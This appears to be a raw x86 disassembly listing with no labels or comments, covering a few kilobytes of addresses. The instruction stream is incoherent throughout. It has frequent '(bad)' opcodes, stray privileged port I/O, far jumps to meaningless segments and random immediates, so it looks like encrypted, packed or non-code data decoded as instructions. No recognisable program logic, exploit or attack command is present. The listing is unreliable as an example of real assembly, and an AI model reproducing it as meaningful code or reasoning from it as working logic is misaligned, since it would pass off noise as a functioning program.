  4208f6:	jp     0x4208f8
  4208f8:	or     al,0x9a
  4208fa:	pop    edx
  4208fb:	fstp   DWORD PTR [ebp+0x5e3ec504]
  420901:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  420903:	js     0x4208c0
  420905:	xchg   BYTE PTR [edi+0x2ca4ff4f],ch
  42090b:	and    dh,al
  42090d:	scas   al,BYTE PTR es:[edi]
  42090e:	mov    bl,al
  420910:	out    0x45,eax
  420912:	dec    edi
  420913:	and    DWORD PTR [edx+0x4b],edx
  420916:	add    bh,BYTE PTR [ecx-0x2d]
  420919:	ror    BYTE PTR cs:[eax-0x7215b368],cl
  420920:	jae    0x4208b5
  420922:	adc    ebx,DWORD PTR [edi+esi*8]
  420925:	mov    ds:0xeabe,eax
  42092a:	add    BYTE PTR [eax],al
  42092c:	add    BYTE PTR [eax],al
  42092e:	add    BYTE PTR [eax],al
  420930:	add    BYTE PTR [ecx-0x57],cl
  420933:	cmp    BYTE PTR [ebp-0x2126208],bl
  420939:	pop    edx
  42093a:	rcr    BYTE PTR [eax+edx*2+0x78e68c2c],0x89
  420942:	add    DWORD PTR [ecx],0x0
  420945:	scas   eax,DWORD PTR es:[edi]
  420946:	add    eax,DWORD PTR [eax]
  420948:	add    BYTE PTR [eax-0x2381db39],bh
  42094e:	pop    edi
  42094f:	mov    bl,0x39
  420951:	sub    al,0x52
  420953:	mov    ?,WORD PTR [eax+0x61]
  420956:	lock in al,0xb
  420959:	std    
  42095a:	ror    DWORD PTR [eax-0x44c96c14],0x1c
  420961:	test   eax,0xb6188770
  420966:	ss mov bh,ah
  420969:	test   esp,ebp
  42096b:	or     al,0x2
  42096d:	adc    bh,bh
  42096f:	out    dx,eax
  420970:	cmp    DWORD PTR [edi],ebp
  420972:	or     al,0x5
  420974:	inc    edi
  420975:	mov    ebp,0xd3adbdc3
  42097a:	adc    BYTE PTR [esi-0x41],ah
  42097d:	mov    ds:0x9cc171ab,eax
  420982:	lock out dx,al
  420984:	jmp    DWORD PTR [esi]
  420986:	jns    0x420925
  420988:	jbe    0x4209c9
  42098a:	test   BYTE PTR [esi-0x7cfcddfe],al
  420990:	xor    al,0x1
  420992:	dec    edx
  420993:	adc    bl,BYTE PTR [esp+ebx*2+0x58]
  420997:	addr16 mov edi,0xe957c761
  42099d:	cmp    eax,0x2a54cff4
  4209a2:	xchg   esi,eax
  4209a3:	add    cl,BYTE PTR [esi+0x66ee21d0]
  4209a9:	ja     0x420946
  4209ab:	daa    
  4209ac:	aaa    
  4209ad:	pop    edx
  4209ae:	add    ebx,DWORD PTR [esi+0x75e16f1c]
  4209b4:	jg     0x42096d
  4209b6:	test   DWORD PTR [ecx+0xa],edx
  4209b9:	rcr    al,1
  4209bb:	pop    edi
  4209bc:	push   ss
  4209bd:	ja     0x4209b7
  4209bf:	adc    al,0x9e
  4209c1:	mov    bh,0xf7
  4209c3:	pop    ecx
  4209c4:	dec    ecx
  4209c5:	addr16 call 0x88c13e66
  4209cb:	push   0xfaa791c8
  4209d0:	dec    esp
  4209d1:	lea    esi,[ecx]
  4209d3:	outs   dx,DWORD PTR ds:[esi]
  4209d4:	cmp    al,0x45
  4209d6:	in     al,dx
  4209d7:	xchg   edx,eax
  4209d8:	push   0xe5b7b66e
  4209dd:	add    eax,DWORD PTR [ebp-0x7dde017e]
  4209e3:	fwait
  4209e4:	(bad)  
  4209e5:	out    0x25,eax
  4209e7:	mov    ebp,0x3ab63eb4
  4209ec:	pop    ebp
  4209ed:	mov    dl,0x8d
  4209ef:	or     DWORD PTR [esi-0x5530fb9d],0x66
  4209f6:	cmc    
  4209f7:	and    eax,0xd9ebeba
  4209fc:	idiv   DWORD PTR ds:0x87a19d0e
  420a02:	cmp    dh,BYTE PTR [esi-0x58]
  420a05:	jb     0x420a01
  420a07:	sbb    eax,0x1a6c1ad4
  420a0c:	jae    0x4209bf
  420a0e:	push   esi
  420a0f:	xchg   ecx,eax
  420a10:	push   ebx
  420a11:	dec    edx
  420a12:	xor    DWORD PTR [ebx],ebx
  420a14:	mov    eax,ds:0x2c4c0109
  420a19:	popf   
  420a1a:	push   0xffffffee
  420a1c:	dec    esi
  420a1d:	mov    WORD PTR [esi-0x22],ds
  420a20:	cld    
  420a21:	dec    edi
  420a22:	jg     0x4209fa
  420a24:	jo     0x420a28
  420a26:	jmp    FWORD PTR [edx]
  420a28:	sbb    al,0xc4
  420a2a:	xor    dl,BYTE PTR [edi+0x28]
  420a2d:	sub    edx,0x32bad9a2
  420a33:	adc    ebp,ebp
  420a35:	push   0xffffffd8
  420a37:	in     al,dx
  420a38:	xor    eax,0xd41a81b3
  420a3d:	int3   
  420a3e:	scas   al,BYTE PTR es:[edi]
  420a3f:	jge    0x420a11
  420a41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a42:	popa   
  420a43:	movzx  ebp,BYTE PTR [ebp-0x62d9a701]
  420a4a:	jge    0x420ab7
  420a4c:	and    ch,BYTE PTR [ecx+0x4]
  420a4f:	jle    0x420a28
  420a51:	loope  0x420a67
  420a53:	sub    BYTE PTR [esi],ch
  420a55:	clc    
  420a56:	mov    eax,0x2150cd6a
  420a5b:	je     0x420a49
  420a5d:	mov    dh,0xf9
  420a5f:	add    al,0xdd
  420a61:	mov    dl,0x92
  420a63:	xor    esp,DWORD PTR ds:0x18008c5a
  420a69:	or     DWORD PTR [eax-0x2ec55f52],ecx
  420a6f:	pop    ss
  420a70:	out    0x81,al
  420a72:	fdivr  QWORD PTR [ebp+0x35]
  420a75:	mov    BYTE PTR [ecx],al
  420a77:	mov    al,0x16
  420a79:	aaa    
  420a7a:	fistp  DWORD PTR [ecx]
  420a7c:	loopne 0x420ae7
  420a7e:	or     eax,0x58eed8ef
  420a83:	xor    DWORD PTR [ebp+0x25d6c4c6],esi
  420a89:	add    al,BYTE PTR [esi-0x8]
  420a8c:	mov    eax,0xd8ee9d34
  420a91:	add    DWORD PTR [ecx-0x6dda5468],esi
  420a97:	iret   
  420a98:	sbb    ch,dl
  420a9a:	mov    esp,0x96774a5
  420a9f:	or     bl,BYTE PTR [eax+0x2f]
  420aa2:	sbb    DWORD PTR [edx-0x4e587cd9],edx
  420aa8:	(bad)  
  420aa9:	mov    ch,0x5b
  420aab:	jne    0x420aeb
  420aad:	or     BYTE PTR [ecx+0x47],al
  420ab0:	addr16 xchg esp,eax
  420ab2:	jbe    0x420a7a
  420ab4:	add    bl,BYTE PTR [edx]
  420ab6:	(bad)  
  420ab8:	repnz scas al,BYTE PTR es:[edi]
  420aba:	jbe    0x420ada
  420abc:	adc    ah,BYTE PTR [eax-0x1c]
  420abf:	fnsave [edx-0x41132f15]
  420ac5:	push   0x99678fc0
  420aca:	ror    DWORD PTR [ebp-0x10],0x53
  420ace:	jmp    0xe20:0x17663dc5
  420ad5:	sbb    al,0x60
  420ad7:	ss daa 
  420ad9:	jb     0x420aac
  420adb:	neg    DWORD PTR [esi+eax*1-0x51]
  420adf:	sbb    BYTE PTR cs:[edi+0x29],0xfa
  420ae4:	lock cwde 
  420ae6:	or     DWORD PTR [eax],ebp
  420ae8:	(bad)  
  420ae9:	call   FWORD PTR [esi-0x64]
  420aec:	(bad)  
  420aed:	jecxz  0x420b3c
  420aef:	pusha  
  420af0:	retf   
  420af1:	inc    ebp
  420af2:	xor    edi,DWORD PTR [eax-0x79e8b30c]
  420af8:	adc    dl,BYTE PTR [eax]
  420afa:	mov    ds:0x65b8692c,al
  420aff:	ja     0x420acd
  420b01:	(bad)  
  420b02:	fidiv  DWORD PTR [edx+0x6945e305]
  420b08:	fdiv   DWORD PTR [edx+0x54f61bc3]
  420b0e:	mov    bh,0x65
  420b10:	jg     0x420b3a
  420b12:	and    eax,DWORD PTR [eax+0x74d6f32b]
  420b18:	adc    DWORD PTR [ebp-0x1b],esi
  420b1b:	or     BYTE PTR [edi-0x3c449797],ah
  420b21:	sbb    eax,0x84df8401
  420b26:	ja     0x420b77
  420b28:	pop    ss
  420b29:	add    ch,BYTE PTR [edx+0x5f910e1b]
  420b2f:	out    0x75,eax
  420b31:	test   DWORD PTR fs:[ecx-0x2d],eax
  420b35:	repnz sub ebx,DWORD PTR [eax+0x697b1da6]
  420b3c:	sbb    al,0x9
  420b3e:	les    ebx,FWORD PTR [esi-0x31acdb03]
  420b44:	push   ecx
  420b45:	ret    0xcaed
  420b48:	push   cs
  420b49:	jmp    0x420bb0
  420b4b:	(bad)  
  420b4c:	jno    0x420b2f
  420b4e:	aaa    
  420b4f:	add    edx,DWORD PTR [edx]
  420b51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b52:	nop
  420b53:	(bad)  
  420b54:	jbe    0x420b85
  420b56:	pop    ebp
  420b57:	mov    eax,ds:0x841684e0
  420b5c:	cwde   
  420b5d:	lods   al,BYTE PTR ds:[esi]
  420b5e:	mov    dh,0xb3
  420b60:	cmp    bh,BYTE PTR [ecx+0x4d6cd074]
  420b66:	push   ds
  420b67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b68:	in     al,dx
  420b69:	mov    bl,0xbc
  420b6b:	and    eax,0x7298cd91
  420b70:	jb     0x420bbe
  420b72:	stos   BYTE PTR es:[edi],al
  420b73:	dec    edx
  420b74:	pop    es
  420b75:	popa   
  420b76:	jl     0x420b51
  420b78:	out    0x50,eax
  420b7a:	rol    BYTE PTR [esi-0x304c1e50],1
  420b80:	pop    ds
  420b81:	test   BYTE PTR [ecx-0x19f3d081],cl
  420b87:	jae    0x420bd4
  420b89:	push   ecx
  420b8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b8b:	xor    BYTE PTR [ecx],cl
  420b8d:	mov    ds:0x2fcbb3b5,eax
  420b92:	neg    DWORD PTR [eax+0x64]
  420b95:	add    dl,BYTE PTR [ebx-0x70451b94]
  420b9b:	leave  
  420b9c:	pusha  
  420b9d:	mov    ch,0x9a
  420b9f:	cmp    al,0x8d
  420ba1:	add    DWORD PTR [esi-0x3c1d9504],ecx
  420ba7:	sub    eax,0x474a131
  420bac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bad:	(bad)  [ecx]
  420baf:	xchg   ebp,eax
  420bb0:	xor    esi,DWORD PTR [ecx+0x4cb238dc]
  420bb6:	jecxz  0x420c35
  420bb8:	cmp    BYTE PTR [eax+0x133d5426],0x11
  420bbf:	mov    ds:0x75f75f25,eax
  420bc4:	jns    0x420c45
  420bc6:	dec    edi
  420bc7:	mov    edi,0x1774bf62
  420bcc:	jmp    0xe95e:0x649b2cc8
  420bd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bd4:	xlat   BYTE PTR ds:[ebx]
  420bd5:	lea    ecx,[ecx+0x13]
  420bd8:	test   DWORD PTR [esi],0x85f2485c
  420bde:	stos   BYTE PTR es:[edi],al
  420bdf:	add    BYTE PTR [eax+edi*2],ch
  420be2:	jb     0x420b78
  420be4:	push   ecx
  420be5:	jno    0x420c29
  420be7:	jmp    0x225a277b
  420bec:	adc    BYTE PTR [ecx+0x62],bh
  420bef:	repnz add ecx,DWORD PTR [esi-0x2c]
  420bf3:	out    0x16,al
  420bf5:	addr16 sti 
  420bf7:	adc    eax,0x2f90a84a
  420bfc:	dec    edi
  420bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bfe:	inc    esp
  420bff:	rcl    DWORD PTR [ebx+0x612ff5ce],cl
  420c05:	fld    TBYTE PTR [edx]
  420c07:	iret   
  420c08:	or     dh,BYTE PTR [ebp+eiz*4+0x4f03d30e]
  420c0f:	push   edi
  420c10:	(bad)  
  420c11:	mov    edi,0x97db9034
  420c16:	test   DWORD PTR [edx],0xf3701e3
  420c1c:	push   ebx
  420c1d:	les    esi,FWORD PTR [esi]
  420c1f:	mov    ecx,0x9a4e8c6
  420c24:	dec    ebp
  420c25:	sub    BYTE PTR [edx+0x27a5cc10],0xc6
  420c2c:	(bad)  
  420c2d:	(bad)  
  420c2e:	pop    esi
  420c2f:	and    ch,BYTE PTR ds:0x88b961cf
  420c35:	stc    
  420c36:	dec    eax
  420c37:	push   es
  420c38:	loop   0x420bcd
  420c3a:	adc    dh,bl
  420c3c:	adc    cl,bl
  420c3e:	push   ds
  420c3f:	mov    eax,cs
  420c41:	adc    BYTE PTR ds:0x8d0c47b,al
  420c47:	xchg   DWORD PTR [ebp-0x2a],ecx
  420c4a:	sbb    bl,BYTE PTR [eax+ecx*2+0x67]
  420c4e:	sub    al,0x61
  420c50:	push   edi
  420c51:	js     0x420c9b
  420c53:	sbb    edx,DWORD PTR [ebx]
  420c55:	inc    ebx
  420c56:	loop   0x420c3c
  420c58:	mov    bh,0x76
  420c5a:	xor    eax,0xcef2afa7
  420c5f:	jno    0x420c43
  420c61:	ins    BYTE PTR es:[edi],dx
  420c62:	mov    ch,ah
  420c64:	(bad)  
  420c65:	sahf   
  420c66:	neg    DWORD PTR [edi-0x64]
  420c69:	mov    bh,0xbc
  420c6b:	mov    eax,ds:0x18822e2e
  420c70:	adc    eax,0x7d14bd15
  420c75:	or     esp,edx
  420c77:	xchg   ecx,eax
  420c78:	jge    0x420cea
  420c7a:	push   edi
  420c7b:	mov    eax,0xba0cab77
  420c80:	out    dx,eax
  420c81:	fwait
  420c82:	scas   eax,DWORD PTR es:[edi]
  420c83:	sub    DWORD PTR [esi],esp
  420c85:	rol    DWORD PTR ds:0xf1a7872b,cl
  420c8b:	xchg   cl,ah
  420c8d:	mov    ch,0xad
  420c8f:	pop    eax
  420c90:	mov    WORD PTR [ebp+0x7608a52],ss
  420c96:	xor    DWORD PTR [ebx+ebp*2],esp
  420c99:	lea    ebx,[ebp-0x28a77656]
  420c9f:	jne    0x420cfa
  420ca1:	int3   
  420ca2:	out    dx,eax
  420ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ca4:	dec    edx
  420ca5:	cmp    ch,BYTE PTR [edi+0xece8985]
  420cab:	arpl   WORD PTR [edx+0x3a],dx
  420cae:	retf   
  420caf:	(bad)  
  420cb1:	shl    BYTE PTR [ecx-0x9],1
  420cb4:	sbb    eax,DWORD PTR [esi]
  420cb6:	mov    ds,WORD PTR [ebp+esi*8+0x30]
  420cba:	sbb    eax,0xa2e02a32
  420cbf:	lock retf 0x2ad0
  420cc3:	inc    eax
  420cc4:	daa    
  420cc5:	cli    
  420cc6:	sub    al,0x1
  420cc8:	mov    eax,0xaef63cc2
  420ccd:	shl    BYTE PTR [ebx],1
  420ccf:	fistp  WORD PTR [esi]
  420cd1:	xchg   esp,eax
  420cd2:	out    0x98,al
  420cd4:	aad    0xe4
  420cd6:	addr16 inc edi
  420cd8:	fidiv  DWORD PTR [edx+0x56]
  420cdb:	mov    cl,0x8
  420cdd:	adc    ecx,DWORD PTR ds:0x378078f8
  420ce3:	push   ecx
  420ce4:	jnp    0x420d1e
  420ce6:	and    BYTE PTR [ecx-0x16],dh
  420ce9:	push   ebx
  420cea:	inc    ebp
  420ceb:	add    dl,BYTE PTR [esi+0x29232923]
  420cf1:	adc    al,BYTE PTR [ecx-0x66]
  420cf4:	sub    BYTE PTR [ebp+0x1f82],bh
  420cfa:	add    BYTE PTR [eax],al
  420cfc:	add    BYTE PTR [eax],al
  420cfe:	add    BYTE PTR [eax],al
  420d00:	add    BYTE PTR [esi],ah
  420d02:	mov    eax,0xbf9f8f0d
  420d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d08:	mov    ecx,0xfe336cff
  420d0d:	retf   0x4f8c
  420d10:	push   edx
  420d11:	cmp    BYTE PTR [edi+0x3af0001],al
  420d17:	add    BYTE PTR [eax],al
  420d19:	nop
  420d1a:	inc    edi
  420d1b:	cs les esi,FWORD PTR ds:[esi-0x18cd4295]
  420d23:	(bad)  
  420d24:	mov    bl,0xc2
  420d26:	push   0xffffffb5
  420d28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d29:	push   ebx
  420d2a:	mov    al,0xb5
  420d2c:	pushf  
  420d2d:	jecxz  0x420d62
  420d2f:	mov    eax,ds:0x710c2304
  420d34:	sub    eax,0x32a64f2e
  420d39:	out    0x6,eax
  420d3b:	xchg   edi,eax
  420d3c:	es xchg ch,bh
  420d3f:	inc    ecx
  420d40:	aam    0x74
  420d42:	mov    edx,0x153469ca
  420d47:	cli    
  420d48:	adc    ebp,DWORD PTR [edx-0x58]
  420d4b:	cmp    ah,BYTE PTR [edi+0x6bec688a]
  420d51:	lds    ecx,FWORD PTR [edx+0x2427027c]
  420d57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d58:	mov    WORD PTR [ecx],gs
  420d5a:	xchg   edi,eax
  420d5b:	lods   eax,DWORD PTR ds:[esi]
  420d5c:	je     0x420d98
  420d5e:	pop    ebp
  420d5f:	(bad)  
  420d60:	fistp  DWORD PTR ds:0x6922bc4e
  420d66:	loopne 0x420d60
  420d68:	mov    dh,0xdd
  420d6a:	imul   edi,DWORD PTR [ebx+0x2d85a9ca],0xfffffffc
  420d71:	push   ss
  420d72:	sub    DWORD PTR [ebx+0x7e],ecx
  420d75:	mov    eax,0x3422bbdb
  420d7a:	mov    ecx,fs
  420d7c:	mov    edx,DWORD PTR ds:0x7562ba13
  420d82:	sbb    esi,DWORD PTR [edx]
  420d84:	push   ss
  420d85:	fiadd  DWORD PTR [eax-0x7780b8c6]
  420d8b:	int3   
  420d8c:	sub    ecx,DWORD PTR [ecx+0x5]
  420d8f:	dec    edx
  420d90:	or     al,0x6a
  420d92:	or     BYTE PTR [edi],bl
  420d94:	fdivr  DWORD PTR [ecx-0x1d]
  420d97:	mov    edi,0x8506236a
  420d9c:	push   cs
  420d9d:	sbb    ch,bh
  420d9f:	jecxz  0x420d66
  420da1:	dec    eax
  420da2:	sub    DWORD PTR [esi-0x662b4722],ebp
  420da8:	pop    ss
  420da9:	into   
  420daa:	mov    eax,ds:0xb007f752
  420daf:	cli    
  420db0:	push   0xffffffdf
  420db2:	(bad)  
  420db3:	dec    esi
  420db4:	inc    esi
  420db5:	sub    DWORD PTR [esi],ebp
  420db7:	push   cs
  420db8:	jmp    0x382da0d2
  420dbd:	cmc    
  420dbe:	popf   
  420dbf:	lock mov ch,0x24
  420dc2:	call   0xf419:0xdab9
  420dc8:	xchg   DWORD PTR [ecx-0x1ea14f61],ebx
  420dce:	mov    eax,ds:0xd37ed6d0
  420dd3:	(bad)
  420dd6:	cmp    esp,DWORD PTR [edx-0x486023b5]
  420ddc:	enter  0xe6fe,0x58
  420de0:	icebp  
  420de1:	sub    ah,bh
  420de3:	ds push eax
  420de5:	sub    ebx,DWORD PTR ds:0x10e0a23b
  420deb:	(bad)  
  420dec:	retf   0xbe7c
  420def:	inc    edi
  420df0:	into   
  420df1:	dec    ebp
  420df2:	mov    ebx,0xfc1f8585
  420df7:	or     al,0x40
  420df9:	call   0x2d05:0x13760fbc
  420e00:	shl    DWORD PTR [edi-0x71],1
  420e03:	add    eax,0xbe71f47d
  420e08:	loop   0x420e51
  420e0a:	adc    BYTE PTR [ebp-0x72],0xd
  420e0e:	mov    esi,0x6f44e341
  420e13:	xor    edx,ecx
  420e15:	mov    ecx,ecx
  420e17:	xchg   ebp,eax
  420e18:	popa   
  420e19:	mov    WORD PTR [edi],ds
  420e1b:	cdq    
  420e1c:	pop    ecx
  420e1d:	ret    0xf382
  420e20:	xlat   BYTE PTR ds:[ebx]
  420e21:	inc    esp
  420e22:	sbb    al,BYTE PTR [esi-0x4a0d54a6]
  420e28:	mov    ebx,0xcffc7d96
  420e2d:	daa    
  420e2e:	fisub  DWORD PTR [eax-0x56e8518]
  420e34:	cdq    
  420e35:	mov    BYTE PTR [edx],cl
  420e37:	sti    
  420e38:	inc    edi
  420e39:	jle    0x420de3
  420e3b:	push   ecx
  420e3c:	les    ecx,FWORD PTR [eax]
  420e3e:	ds cmp edx,0x577777a5
  420e45:	ins    BYTE PTR es:[edi],dx
  420e46:	outs   dx,DWORD PTR ds:[esi]
  420e47:	pop    edi
  420e48:	(bad)  
  420e49:	jmp    0xe18f:0xd0aed822
  420e50:	out    dx,al
  420e51:	or     bl,ah
  420e53:	add    al,0x3b
  420e55:	mov    dh,dh
  420e57:	fdiv   DWORD PTR [esi]
  420e59:	push   es
  420e5a:	ds mov ebp,0xaa27c7ab
  420e60:	addr16 xchg edi,eax
  420e62:	lods   eax,DWORD PTR ds:[esi]
  420e63:	pop    ecx
  420e64:	scas   al,BYTE PTR es:[edi]
  420e65:	popa   
  420e66:	pop    ss
  420e67:	cld    
  420e68:	dec    eax
  420e69:	inc    ecx
  420e6a:	xchg   ebx,eax
  420e6b:	(bad)  [edx+0x51]
  420e6e:	mov    bl,0x4e
  420e70:	ret    0x6708
  420e73:	imul   esi,DWORD PTR [ebx+0x2f],0xffffffd1
  420e77:	ins    DWORD PTR es:[edi],dx
  420e78:	fistp  WORD PTR [ebp-0x49]
  420e7b:	and    ecx,eax
  420e7d:	fst    QWORD PTR [ebp+0x31]
  420e80:	jp     0x420ed5
  420e82:	mov    edi,0x8c73fb61
  420e87:	dec    esi
  420e88:	int3   
  420e89:	sub    bl,0xe3
  420e8c:	and    DWORD PTR [edi+0x55cc8ec2],eax
  420e92:	inc    ecx
  420e93:	and    bh,BYTE PTR [ebp+0x2b]
  420e96:	inc    eax
  420e97:	cmp    BYTE PTR [edx],ah
  420e99:	inc    ebp
  420e9a:	repnz (bad) 
  420e9c:	cmc    
  420e9d:	in     eax,0xc4
  420e9f:	mov    ?,WORD PTR ds:[edi+0x2e4e0242]
  420ea6:	mov    ds:0xc872ace9,al
  420eab:	das    
  420eac:	add    BYTE PTR [ecx],dh
  420eae:	aam    0x39
  420eb0:	ds mov ch,0x2d
  420eb3:	sbb    DWORD PTR [ecx-0x228703a4],0xffffffbf
  420eba:	int    0xb
  420ebc:	sub    al,bl
  420ebe:	cmp    cl,ah
  420ec0:	test   eax,0x88912351
  420ec5:	(bad)  
  420ec7:	je     0x420e50
  420ec9:	mov    dh,0x6e
  420ecb:	xchg   DWORD PTR ds:0x5fc53265,ebp
  420ed1:	inc    esi
  420ed2:	jge    0x420ed4
  420ed4:	cmp    dl,BYTE PTR [ebx-0xd]
  420ed7:	or     cl,BYTE PTR [edx]
  420ed9:	jmp    0x420f44
  420edb:	ins    BYTE PTR es:[edi],dx
  420edc:	fstp   st(1)
  420ede:	cli    
  420edf:	sub    ah,ah
  420ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ee2:	rcr    bh,0xe7
  420ee5:	pop    esp
  420ee6:	sti    
  420ee7:	push   ds
  420ee8:	inc    ebx
  420ee9:	push   0x6541db94
  420eee:	mov    ah,0xdc
  420ef0:	popf   
  420ef1:	and    al,0xa5
  420ef3:	loopne 0x420f26
  420ef5:	add    ah,ch
  420ef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ef8:	pop    es
  420ef9:	add    al,0x9c
  420efb:	cwde   
  420efc:	and    ebp,DWORD PTR [esi]
  420efe:	push   esi
  420eff:	adc    BYTE PTR [edi+0x353836d6],ch
  420f05:	jae    0x420f55
  420f07:	div    BYTE PTR [edi+0x50]
  420f0a:	xlat   BYTE PTR ds:[ebx]
  420f0b:	cmp    BYTE PTR [esi-0x56],ch
  420f0e:	ror    DWORD PTR ds:0xd06d6c3e,0xfc
  420f15:	rcl    BYTE PTR [ecx-0x32],0x9
  420f19:	fdiv   st,st(5)
  420f1b:	pusha  
  420f1c:	cmp    BYTE PTR [edi],ch
  420f1e:	inc    esp
  420f1f:	fisttp WORD PTR [eax-0x25]
  420f22:	hlt    
  420f23:	mov    al,ds:0xf6894b06
  420f28:	jg     0x420f75
  420f2a:	(bad)  
  420f2b:	cli    
  420f2c:	popf   
  420f2d:	ja     0x420f8d
  420f2f:	std    
  420f30:	mov    ecx,0xc9df536c
  420f35:	fnstenv [eax-0x2e]
  420f38:	adc    esi,DWORD PTR gs:[ebp+eiz*1+0x3833464d]
  420f40:	inc    ecx
  420f41:	add    ch,BYTE PTR [eax+ebp*4-0x36]
  420f45:	adc    ebx,DWORD PTR [ebp-0x444c6152]
  420f4b:	cdq    
  420f4c:	xchg   ebp,eax
  420f4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f4e:	push   ebx
  420f4f:	pop    es
  420f50:	ds jne 0x420f08
  420f53:	inc    edi
  420f54:	jmp    0x420f09
  420f56:	or     DWORD PTR [edi-0x31b92fe9],eax
  420f5c:	repnz loopne 0x420f08
  420f5f:	sti    
  420f60:	cmp    BYTE PTR [esi+0x3e],bl
  420f63:	outs   dx,DWORD PTR ds:[esi]
  420f64:	fbld   TBYTE PTR [edx-0x7f]
  420f67:	or     DWORD PTR [ebx-0x6f],edi
  420f6a:	pusha  
  420f6b:	adc    dh,BYTE PTR [eax]
  420f6d:	icebp  
  420f6e:	mov    eax,0x4dbbbd75
  420f73:	sahf   
  420f74:	enter  0xb12e,0x82
  420f78:	sub    eax,ebx
  420f7a:	xchg   ecx,eax
  420f7b:	lods   eax,DWORD PTR ds:[esi]
  420f7c:	cmp    al,0x80
  420f7e:	(bad)  
  420f7f:	aas    
  420f80:	inc    esi
  420f81:	jmp    0xb27af006
  420f86:	cmp    eax,0x6577220f
  420f8b:	mov    ds:0x62d10d21,eax
  420f90:	sbb    cl,ah
  420f92:	in     eax,0xd7
  420f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f95:	push   cs
  420f96:	cwde   
  420f97:	ret    0x4a3d
  420f9a:	sbb    DWORD PTR [edx],eax
  420f9c:	je     0x420f42
  420f9e:	mov    ebp,0xf6a00c29
  420fa3:	test   esi,ebp
  420fa5:	jmp    ebp
  420fa7:	xor    ah,0x53
  420faa:	inc    eax
  420fab:	loopne 0x420fb0
  420fad:	add    DWORD PTR [edx-0x61],0x5
  420fb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fb2:	std    
  420fb3:	add    al,0xc9
  420fb5:	daa    
  420fb6:	int3   
  420fb7:	mov    ah,0x75
  420fb9:	mov    eax,0x8db0b9ac
  420fbe:	pop    ebx
  420fbf:	add    BYTE PTR [ebx],al
  420fc1:	inc    ebp
  420fc2:	xchg   BYTE PTR [ebx+0x5c4bd263],al
  420fc8:	sbb    cl,al
  420fca:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  420fcc:	push   ecx
  420fcd:	aaa    
  420fce:	shl    DWORD PTR [ebp-0x50],0xdc
  420fd2:	fbld   TBYTE PTR [ebx-0x34]
  420fd5:	push   cs
  420fd6:	aam    0x77
  420fd8:	sub    al,0x97
  420fda:	and    DWORD PTR [ebx+edx*4-0x39],esp
  420fde:	psubusw mm3,mm3
  420fe1:	inc    ecx
  420fe2:	jl     0x420f93
  420fe4:	mov    eax,0x86447d8f
  420fe9:	jmp    0x421064
  420feb:	mov    dh,0x35
  420fed:	mov    edi,0x987e0801
  420ff2:	inc    ecx
  420ff3:	imul   eax,DWORD PTR [edi-0x313f1851],0x1d
  420ffa:	ins    DWORD PTR es:[edi],dx
  420ffb:	cwde   
  420ffc:	and    al,0xee
  420ffe:	xor    esi,edi
  421000:	or     edx,DWORD PTR [edi-0xa]
  421003:	ins    BYTE PTR es:[edi],dx
  421004:	shl    BYTE PTR [ebx-0x2e],1
  421007:	sbb    edi,DWORD PTR [edi+ecx*4]
  42100a:	fsub   QWORD PTR [ebx]
  42100c:	test   BYTE PTR [eax+0x333a04eb],al
  421012:	std    
  421013:	sub    DWORD PTR ds:0x848ddf9d,ebp
  421019:	inc    edi
  42101a:	aaa    
  42101b:	push   0xffacded0
  421020:	mov    BYTE PTR [edi+0x33],al
  421023:	cmp    eax,0x9859f163
  421028:	cmp    DWORD PTR [edx+0x1980ce7e],ecx
  42102e:	das    
  42102f:	dec    esp
  421030:	adc    DWORD PTR [esi-0x481f5d2c],ebx
  421036:	adc    DWORD PTR [eax],ebx
  421038:	push   eax
  421039:	push   0xacb28885
  42103e:	pop    ds
  42103f:	xor    DWORD PTR [ebp-0x5f],ebx
  421042:	in     al,0x2b
  421044:	mov    ebx,0xc6a17158
  421049:	hlt    
  42104a:	lahf   
  42104b:	les    ebx,FWORD PTR [esi-0x1249f309]
  421051:	out    dx,eax
  421052:	mov    bl,0x4e
  421054:	mov    dh,0x8d
  421056:	push   ecx
  421057:	out    0x37,eax
  421059:	pop    esp
  42105a:	mov    ch,0x7a
  42105c:	ins    DWORD PTR es:[edi],dx
  42105d:	xchg   edi,eax
  42105e:	fdiv   QWORD PTR [ecx+0x52]
  421061:	ins    DWORD PTR es:[edi],dx
  421062:	mov    ebp,0x6045602a
  421067:	fsub   QWORD PTR [edx]
  421069:	jne    0x421081
  42106b:	jmp    0x73b66e6e
  421070:	add    DWORD PTR [ebp+0x45],0x44
  421074:	fnstcw WORD PTR [esi-0x2d]
  421077:	(bad)  
  421079:	shr    dl,cl
  42107b:	push   ebp
  42107c:	mov    ecx,0x5b3ae3f0
  421081:	popf   
  421082:	fimul  WORD PTR [edi-0x797fbf7a]
  421088:	push   es
  421089:	cmc    
  42108a:	fadd   DWORD PTR [edi-0x765357c5]
  421090:	inc    edx
  421091:	ret    0xdd2
  421094:	jl     0x4210af
  421096:	add    ebp,DWORD PTR [edi-0x66]
  421099:	jo     0x42106f
  42109b:	cwde   
  42109c:	add    BYTE PTR [esi+eax*2-0x36],dl
  4210a0:	mov    ecx,ebx
  4210a2:	jle    0x421047
  4210a4:	jg     0x4210d9
  4210a6:	dec    edi
  4210a7:	sahf   
  4210a8:	xor    bh,BYTE PTR [edi]
  4210aa:	sbb    DWORD PTR [ebp-0x28],eax
  4210ad:	outs   dx,DWORD PTR ds:[si]
